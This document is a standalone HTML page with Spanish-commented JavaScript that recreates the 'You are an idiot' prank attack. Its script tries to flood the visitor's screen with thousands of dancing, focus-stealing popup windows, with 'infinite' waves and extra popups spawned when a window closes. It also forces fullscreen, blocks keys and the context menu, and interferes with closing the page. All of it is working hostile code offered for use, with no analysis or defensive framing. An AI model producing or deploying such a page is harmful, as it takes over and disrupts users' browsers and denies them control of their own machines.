<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>You are an idiot</title>
</head>
<body style="background:#fff;overflow:hidden;margin:0;cursor:none;">

<h1 style="font-size:10vw;font-family:Arial;text-align:center;margin-top:20vh;animation:fl 0.1s infinite;">
YOU ARE AN IDIOT
</h1>
<style>
@keyframes fl { 0%,100%{opacity:1} 50%{opacity:0} }
</style>

<script>
// ================================================================
// TÉCNICA REAL: BOMBARDEO DE EVENTOS SINTÉTICOS
// ================================================================

// Cada popup necesita un evento de usuario individual.
// Creamos miles de eventos keydown y los disparamos.
// CADA evento abre UN popup.

var wins = [];
var totalAbiertas = 0;
var MAX = 50000; // Máximo de ventanas a abrir

// ================================================================
// 1. CREAR UN KEYDOWN FALSO Y ABRIR UN POPUP
// ================================================================

function dispararUnPopup(url) {
    if (totalAbiertas >= MAX) return;
    
    // Escuchamos el evento UNA SOLA VEZ
    function handler(e) {
        document.removeEventListener('keydown', handler);
        
        try {
            var nombreUnico = 'w' + Date.now() + '_' + totalAbiertas + '_' + Math.random().toString(36).substr(2,6);
            var p = window.open(url, nombreUnico,
                'width=180,height=175,left=' + (Math.random() * screen.width) + ',top=' + 
                (Math.random() * screen.height) + ',menubar=no,status=no,toolbar=no,resizable=no,scrollbars=no');
            
            if (p && !p.closed) {
                wins.push(p);
                totalAbiertas++;
                // Hacer que baile
                hacerBailar(p);
            }
        } catch(e) {}
    }
    
    document.addEventListener('keydown', handler);
    
    // Disparamos el evento sintético
    var evt = new KeyboardEvent('keydown', {
        key: 'Enter', keyCode: 13, which: 13,
        code: 'Enter', bubbles: true, cancelable: true
    });
    document.dispatchEvent(evt);
}

// ================================================================
// 2. HACER BAILAR LAS VENTANAS
// ================================================================

function hacerBailar(p) {
    var x = Math.random() * (screen.width - 200);
    var y = Math.random() * (screen.height - 200);
    var dx = (Math.random() - 0.5) * 30;
    var dy = (Math.random() - 0.5) * 30;
    
    function baila() {
        if (!p || p.closed) return;
        try {
            x += dx; y += dy;
            if (x < 0 || x > screen.width - 180) dx *= -1;
            if (y < 0 || y > screen.height - 175) dy *= -1;
            if (Math.random() < 0.05) { dx = (Math.random()-0.5)*40; dy = (Math.random()-0.5)*40; }
            p.moveTo(Math.round(x), Math.round(y));
            try { p.focus(); } catch(e) {}
            setTimeout(baila, 8);
        } catch(e) {
            setTimeout(baila, 50);
        }
    }
    baila();
}

// ================================================================
// 3. PROCREATE (al cerrar)
// ================================================================

function procreate() {
    for (var i = 0; i < 40; i++) {
        setTimeout(function() { dispararUnPopup('open.html'); }, i * 5);
    }
}

// ================================================================
// 4. LANZAMIENTO MASIVO
// ================================================================

function lanzarTormenta() {
    // FASE 1: 500 popups en 5 segundos (100 por segundo)
    for (var i = 0; i < 500; i++) {
        setTimeout(function() { dispararUnPopup('open.html'); }, i * 10);
    }
    
    // FASE 2: 1000 popups más (200 por segundo)
    setTimeout(function() {
        for (var i = 0; i < 1000; i++) {
            setTimeout(function() { dispararUnPopup('open.html'); }, i * 5);
        }
    }, 6000);
    
    // FASE 3: 3000 popups más (300 por segundo)
    setTimeout(function() {
        for (var i = 0; i < 3000; i++) {
            setTimeout(function() { dispararUnPopup('open.html'); }, i * 3);
        }
    }, 12000);
    
    // FASE 4: Oleada infinita — 50 cada segundo para siempre
    setInterval(function() {
        for (var i = 0; i < 50; i++) {
            setTimeout(function() { dispararUnPopup('open.html'); }, i * 2);
        }
    }, 1000);
    
    // Refuerzo constante: 1 cada 5ms (200/segundo)
    setInterval(function() {
        dispararUnPopup('open.html');
    }, 5);
}

// ================================================================
// 5. INICIO
// ================================================================

// Forzar fullscreen
try {
    var d = document.documentElement;
    (d.requestFullscreen || d.webkitRequestFullscreen || d.mozRequestFullScreen || d.msRequestFullscreen).call(d);
} catch(e) {}

// Bloquear teclas
window.onbeforeunload = function() { return " "; };
window.onkeydown = document.onkeydown = function(e) { e.preventDefault(); return false; };
document.oncontextmenu = function(e) { e.preventDefault(); return false; };

// Primera descarga masiva
setTimeout(lanzarTormenta, 500);

// Si se cierra la ventana, más
window.onunload = procreate;
</script>

</body>
</html>
